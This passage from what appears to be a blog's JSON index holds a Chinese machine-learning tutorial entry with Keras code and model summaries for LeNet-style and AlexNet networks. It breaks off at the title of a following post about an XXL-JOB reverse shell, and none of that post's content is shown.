…
 activation=&#x27;relu&#x27;))# 池化层model.add(MaxPooling2D(pool_size=(2, 2)))# 展平model.add(Flatten())# 全连接层model.add(Dense(120, activation=&#x27;relu&#x27;))# 全连接层model.add(Dense(84, activation=&#x27;relu&#x27;))# 全连接层model.add(Dense(10, activation=&#x27;softmax&#x27;))# 模型编译model.compile(loss=keras.metrics.categorical_crossentropy, optimizer=keras.optimizers.Adam(), metrics=[&#x27;accuracy&#x27;])model.summary() _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= conv2d_5 (Conv2D) (None, 24, 24, 6) 156 _________________________________________________________________ max_pooling2d_4 (MaxPooling2 (None, 12, 12, 6) 0 _________________________________________________________________ conv2d_6 (Conv2D) (None, 8, 8, 16) 2416 _________________________________________________________________ max_pooling2d_5 (MaxPooling2 (None, 4, 4, 16) 0 _________________________________________________________________ flatten_3 (Flatten) (None, 256) 0 _________________________________________________________________ dense_6 (Dense) (None, 120) 30840 _________________________________________________________________ dense_7 (Dense) (None, 84) 10164 _________________________________________________________________ dense_8 (Dense) (None, 10) 850 ================================================================= Total params: 44,426 Trainable params: 44,426 Non-trainable params: 0 _________________________________________________________________ AlexNet 模型模型架构如下：一共有5个卷积层（Conv2D），8个神经网络层（Conv2D + Dense） 123456789101112131415161718192021222324252627# 创建模型序列 model = Sequential()#第一层卷积网络，使用96个卷积核，大小为11x11步长为4， 要求输入的图片为227x227， 3个通道，不加边，激活函数使用r
…
&#x27;))model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2)))model.add(Flatten())model.add(Dense(4096, activation=&#x27;relu&#x27;))model.add(Dropout(0.5))model.add(Dense(4096, activation=&#x27;relu&#x27;))model.add(Dropout(0.5))model.add(Dense(10, activation=&#x27;softmax&#x27;))model.compile(loss=&#x27;categorical_crossentropy&#x27;, optimizer=&#x27;sgd&#x27;, metrics=[&#x27;accuracy&#x27;])model.summary() _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= conv2d_7 (Conv2D) (None, 28, 28, 96) 11712 _________________________________________________________________ max_pooling2d_6 (MaxPooling2 (None, 13, 13, 96) 0 _________________________________________________________________ conv2d_8 (Conv2D) (None, 13, 13, 256) 614656 _________________________________________________________________ max_pooling2d_7 (MaxPooling2 (None, 6, 6, 256) 0 _________________________________________________________________ conv2d_9 (Conv2D) (None, 6, 6, 384) 885120 _________________________________________________________________ conv2d_10 (Conv2D) (None, 6, 6, 384) 1327488 _________________________________________________________________ conv2d_11 (Conv2D) (None, 6, 6, 256) 884992 _________________________________________________________________ max_pooling2d_8 (MaxPooling2 (None, 2, 2, 256) 0 _________________________________________________________________ flatten_4 (Flatten) (None, 1024) 0 _________________________________________________________________ dense_9 (Dense) (None, 4096) 4198400 _________________________________________________________________ dropout_3 (Dropout) (None, 4096) 0 _________________________________________________________________ dense_10 (Dense) (None, 4096) 16781312 _________________________________________________________________ dropout_4 (Dropout) (None, 4096) 0 _________________________________________________________________ dense_11 (Dense) (None, 10) 40970 ================================================================= Total params: 24,744,650 Trainable params: 24,744,650 Non-trainable params: 0 _________________________________________________________________ 1","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"XXL-JOB反弹shell之打野","slug":"XXL-JOB反弹sh
…
